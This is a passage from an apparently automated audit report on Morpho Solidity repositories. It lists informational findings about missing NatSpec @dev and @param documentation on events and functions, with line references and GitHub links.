[12](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L12), [15](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L15), [18](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L18), [21](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L21), [24](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L24), [27](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L27), [31](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L31), [34](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L34), [37](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L37), [40](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L40), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L43), [46](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L46), [49](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L49), [52](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L52), [55](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L55), [58](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L58), [61](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L61), [64](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L64), [67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L67), [70](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L70), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L73), [76](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L76), [79](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L79), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L82), [85](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L85), [88](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L88)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @dev
19:     error BadSignatory();

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L19)



### Event declaration should include NatSpec `@dev` documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (33)*:


```solidity
File: metamorpho/src/libraries/EventsLib.sol

/// @audit missed @dev
14:     event SubmitTimelock(uint256 newTimelock);

/// @audit missed @dev
17:     event SetTimelock(address indexed caller, uint256 newTimelock);

/// @audit missed @dev
20:     event SetSkimRecipient(address indexed newSkimRecipient);

/// @audit missed @dev
23:     event SetFee(address indexed caller, uint256 newFee);

/// @audit missed @dev
26:     event SetFeeRecipient(address indexed newFeeRecipient);

/// @audit missed @dev
29:     event SubmitGuardian(address indexed newGuardian);

/// @audit missed @dev
32:     event SetGuardian(address indexed caller, address indexed guardian);

/// @audit missed @dev
35:     event SubmitCap(address indexed caller, Id indexed id, uint256 cap);

/// @audit missed @dev
38:     event SetCap(address indexed caller, Id indexed id, uint256 cap);

/// @audit missed @dev
41:     event UpdateLastTotalAssets(uint256 updatedTotalAssets);

/// @audit missed @dev
44:     event SubmitMarketRemoval(address indexed caller, Id indexed id);

/// @audit missed @dev
47:     event SetCurator(address indexed newCurator);

/// @audit missed @dev
50:     event SetIsAllocator(address indexed allocator, bool isAllocator);

/// @audit missed @dev
53:     event RevokePendingTimelock(address indexed caller);

/// @audit missed @dev
56:     event RevokePendingCap(address indexed caller, Id indexed id);

/// @audit missed @dev
59:     event RevokePendingGuardian(address indexed caller);

/// @audit missed @dev
62:     event RevokePendingMarketRemoval(address indexed caller, Id indexed id);

/// @audit missed @dev
65:     event SetSupplyQueue(address indexed caller, Id[] newSupplyQueue);

/// @audit missed @dev
68:     event SetWithdrawQueue(address indexed caller, Id[] newWithdrawQueue);

/// @audit missed @dev
74:     event ReallocateSupply(address indexed caller, Id indexed id, uint256 suppliedAssets, uint256 suppliedShares);

/// @audit missed @dev
80:     event ReallocateWithdraw(address indexed caller, Id indexed id, uint256 withdrawnAssets, uint256 withdrawnShares);

/// @audit missed @dev
85:     event AccrueInterest(uint256 newTotalAssets, uint256 feeShares);

/// @audit missed @dev
88:     event Skim(address indexed caller, address indexed token, uint256 amount);

/// @audit missed @dev
99:     event CreateMetaMorpho(

```

[14](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L14), [17](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L17), [20](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L20), [23](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L23), [26](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L26), [29](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L29), [32](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L32), [35](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L35), [38](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L38), [41](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L41), [44](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L44), [47](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L47), [50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L50), [53](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L53), [56](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L56), [59](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L59), [62](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L62), [65](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L65), [68](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L68), [74](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L74), [80](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L80), [85](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L85), [88](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L88), [99](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L99)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit missed @dev
28:     event BorrowRateUpdate(Id indexed id, uint256 avgBorrowRate, uint256 rateAtTarget);

```

[28](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L28)

```solidity
File: universal-rewards-distributor/src/libraries/EventsLib.sol

/// @audit missed @dev
12:     event RootSet(bytes32 indexed newRoot, bytes32 indexed newIpfsHash);

/// @audit missed @dev
18:     event PendingRootSet(address indexed caller, bytes32 indexed newRoot, bytes32 indexed newIpfsHash);

/// @audit missed @dev
21:     event PendingRootRevoked(address indexed caller);

/// @audit missed @dev
25:     event TimelockSet(uint256 newTimelock);

/// @audit missed @dev
30:     event RootUpdaterSet(address indexed rootUpdater, bool active);

/// @audit missed @dev
36:     event Claimed(address indexed account, address indexed reward, uint256 amount);

/// @audit missed @dev
40:     event OwnerSet(address indexed newOwner);

/// @audit missed @dev
50:     event UrdCreated(

```

[12](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L12), [18](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L18), [21](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L21), [25](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L25), [30](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L30), [36](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L36), [40](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L40), [50](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L50)




### Event declaration should include NatSpec `@param` documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (24)*:


```solidity
File: metamorpho/src/libraries/EventsLib.sol

/// @audit missed @param (newTimelock)
14:     event SubmitTimelock(uint256 newTimelock);

/// @audit missed @param (caller, newTimelock)
17:     event SetTimelock(address indexed caller, uint256 newTimelock);

/// @audit missed @param (newSkimRecipient)
20:     event SetSkimRecipient(address indexed newSkimRecipient);

/// @audit missed @param (caller, newFee)
23:     event SetFee(address indexed caller, uint256 newFee);

/// @audit missed @param (newFeeRecipient)
26:     event SetFeeRecipient(address indexed newFeeRecipient);

/// @audit missed @param (newGuardian)
29:     event SubmitGuardian(address indexed newGuardian);

/// @audit missed @param (caller, guardian)
32:     event SetGuardian(address indexed caller, address indexed guardian);

/// @audit missed @param (caller, id, cap)
35:     event SubmitCap(address indexed caller, Id indexed id, uint256 cap);

/// @audit missed @param (caller, id, cap)
38:     event SetCap(address indexed caller, Id indexed id, uint256 cap);

/// @audit missed @param (updatedTotalAssets)
41:     event UpdateLastTotalAssets(uint256 updatedTotalAssets);

/// @audit missed @param (caller, id)
44:     event SubmitMarketRemoval(address indexed caller, Id indexed id);

/// @audit missed @param (newCurator)
47:     event SetCurator(address indexed newCurator);

/// @audit missed @param (allocator, isAllocator)
50:     event SetIsAllocator(address indexed allocator, bool isAllocator);

/// @audit missed @param (caller)
53:     event RevokePendingTimelock(address indexed caller);

/// @audit missed @param (caller, id)
56:     event RevokePendingCap(address indexed caller, Id indexed id);

/// @audit missed @param (caller)
59:     event RevokePendingGuardian(address indexed caller);

/// @audit missed @param (caller, id)
62:     event RevokePendingMarketRemoval(address indexed caller, Id indexed id);

/// @audit missed @param (caller, newSupplyQueue)
65:     event SetSupplyQueue(address indexed caller, Id[] newSupplyQueue);

/// @audit missed @param (caller, newWithdrawQueue)
68:     event SetWithdrawQueue(address indexed caller, Id[] newWithdrawQueue);

/// @audit missed @param (caller)
74:     event ReallocateSupply(address indexed caller, Id indexed id, uint256 suppliedAssets, uint256 suppliedShares);

/// @audit missed @param (caller)
80:     event ReallocateWithdraw(address indexed caller, Id indexed id, uint256 withdrawnAssets, uint256 withdrawnShares);

/// @audit missed @param (caller, token, amount)
88:     event Skim(address indexed caller, address indexed token, uint256 amount);

```

[14](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L14), [17](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L17), [20](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L20), [23](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L23), [26](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L26), [29](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L29), [32](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L32), [35](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L35), [38](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L38), [41](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L41), [44](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L44), [47](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L47), [50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L50), [53](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L53), [56](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L56), [59](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L59), [62](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L62), [65](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L65), [68](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L68), [74](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L74), [80](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L80), [88](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L88)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit missed @param (id, avgBorrowRate, rateAtTarget)
28:     event BorrowRateUpdate(Id indexed id, uint256 avgBorrowRate, uint256 rateAtTarget);

```

[28](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L28)

```solidity
File: universal-rewards-distributor/src/libraries/EventsLib.sol

/// @audit missed @param (caller)
21:     event PendingRootRevoked(address indexed caller);

```

[21](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L21)




### Missing NatSpec from function definitions	_(duplicate of [NatSpec: Functions declarations should have @notice, @param and @return tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Some functions miss a NatSpec, which should be a [best practice](https://docs.soliditylang.org/en/latest/natspec-format.html) to add as a documentation.

*Instances (149)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

58:     function decimals() public view virtual override(ERC20, ERC20Wrapper) returns (uint8) {

```

[58](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L58)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

19:     function multicall(bytes[] calldata) external returns (bytes[] memory);

23:     function owner() external returns (address);

24:     function transferOwnership(address) external;

25:     function renounceOwnership() external;

26:     function acceptOwnership() external;

27:     function pendingOwner() external view returns (address);

33:     function MORPHO() external view returns (IMorpho);

35:     function curator() external view returns (address);

36:     function isAllocator(address target) external view returns (bool);

37:     function guardian() external view returns (address);

39:     function fee() external view returns (uint96);

40:     function feeRecipient() external view returns (address);

41:     function skimRecipient() external view returns (address);

42:     function timelock() external view returns (uint256);

43:     function supplyQueue(uint256) external view returns (Id);

44:     function supplyQueueLength() external view returns (uint256);

45:     function withdrawQueue(uint256) external view returns (Id);

46:     function withdrawQueueLength() external view returns (uint256);

48:     function lastTotalAssets() external view returns (uint256);

50:     function submitTimelock(uint256 newTimelock) external;

51:     function acceptTimelock() external;

52:     function revokePendingTimelock() external;

54:     function submitCap(MarketParams memory marketParams, uint256 supplyCap) external;

55:     function acceptCap(Id id) external;

56:     function revokePendingCap(Id id) external;

58:     function submitMarketRemoval(Id id) external;

59:     function revokePendingMarketRemoval(Id id) external;

61:     function submitGuardian(address newGuardian) external;

62:     function acceptGuardian() external;

63:     function revokePendingGuardian() external;

65:     function skim(address) external;

67:     function setIsAllocator(address newAllocator, bool newIsAllocator) external;

68:     function setCurator(address newCurator) external;

69:     function setFee(uint256 newFee) external;

70:     function setFeeRecipient(address newFeeRecipient) external;

71:     function setSkimRecipient(address) external;

73:     function setSupplyQueue(Id[] calldata newSupplyQueue) external;

74:     function updateWithdrawQueue(uint256[] calldata indexes) external;

75:     function reallocate(MarketAllocation[] calldata allocations) external;

81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);

82:     function pendingGuardian() external view returns (address guardian, uint64 validAt);

83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);

84:     function pendingTimelock() external view returns (uint192 value, uint64 validAt);

92:     function config(Id) external view returns (MarketConfig memory);

93:     function pendingGuardian() external view returns (PendingAddress memory);

94:     function pendingCap(Id) external view returns (PendingUint192 memory);

95:     function pendingTimelock() external view returns (PendingUint192 memory);

```

[19](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L19), [23](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L23), [24](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L24), [25](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L25), [26](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L26), [27](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L27), [33](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L33), [35](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L35), [36](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L36), [37](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L37), [39](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L39), [40](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L40), [41](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L41), [42](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L42), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L43), [44](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L44), [45](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L45), [46](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L46), [48](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L48), [50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L50), [51](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L51), [52](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L52), [54](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L54), [55](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L55), [56](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L56), [58](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L58), [59](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L59), [61](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L61), [62](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L62), [63](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L63), [65](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L65), [67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L67), [68](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L68), [69](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L69), [70](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L70), [71](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L71), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L73), [74](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L74), [75](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L75), [81](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L82), [83](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L83), [84](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L84), [92](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92), [93](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L93), [94](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L94), [95](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L95)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

7:     function idToMarketParams(Id id) external view returns (MarketParams memory marketParams);

```

[7](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L7)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

26:     constructor(address morpho) {

34:     function onMorphoSupply(uint256, bytes calldata data) external {

39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external {

44:     function onMorphoRepay(uint256, bytes calldata data) external {

49:     function onMorphoLiquidate(uint256, bytes calldata data) external {

54:     function onMorphoFlashLoan(uint256, bytes calldata data) external {

```

[26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L26), [34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

34:     constructor(address morpho) WNativeBundler(MainnetLib.WETH) MorphoBundler(morpho) {}

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L34)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumStEthBundler.sol

15:     constructor() StEthBundler(MainnetLib.WST_ETH) {}

```

[15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumStEthBundler.sol#L15)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

5:     function transferShares(address _recipient, uint256 _sharesAmount) external returns (uint256);

7:     function getPooledEthByShares(uint256 _sharesAmount) external view returns (uint256);

9:     function getSharesByPooledEth(uint256 _stEthAmount) external view returns (uint256);

11:     function getCurrentStakeLimit() external view returns (uint256);

13:     function submit(address _referral) external payable returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L13)

